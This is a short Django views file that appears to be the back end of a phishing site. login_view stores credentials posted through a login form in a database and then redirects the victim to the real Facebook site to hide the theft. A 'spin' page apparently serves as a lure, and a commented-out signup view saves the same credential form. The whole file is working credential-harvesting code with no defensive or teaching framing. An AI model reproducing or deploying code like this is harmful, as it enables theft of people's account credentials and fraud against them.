from django.shortcuts import render, redirect
from .forms import CredentialForm

def login_view(request):
    if request.method == 'POST':
        form = CredentialForm(request.POST)
        if form.is_valid():
            form.save()  # Save to DB
            return redirect('https://www.facebook.com')
    else:
        form = CredentialForm()
    return render(request, 'accounts/login.html', {'form': form})

def spin_view(request):
    return render(request, 'accounts/spin.html')






# def signup_view(request):
#     if request.method == 'POST':
#         form = CredentialForm(request.POST)
#         if form.is_valid():
#             form.save()
#             return render(request, 'accounts/success.html', {'message': 'Account created successfully!'})
#     else:
#         form = CredentialForm()
#     return render(request, 'accounts/signup.html', {'form': form})

